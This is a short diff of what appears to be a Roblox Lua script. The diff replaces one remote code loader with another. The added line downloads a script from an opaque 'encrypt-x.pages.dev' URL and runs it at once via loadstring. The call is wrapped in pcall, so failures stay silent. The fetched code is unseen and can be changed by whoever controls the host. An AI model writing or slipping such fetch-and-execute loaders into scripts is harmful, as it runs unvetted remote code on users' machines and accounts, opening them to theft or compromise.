@@ -263,5 +263,5 @@ newBtn.MouseButton1Click:Connect(function()
 end)
 
 pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/Yv9HrbIl/raw", true))()
+    loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=7055731969973"))("7055731969973")
 end)
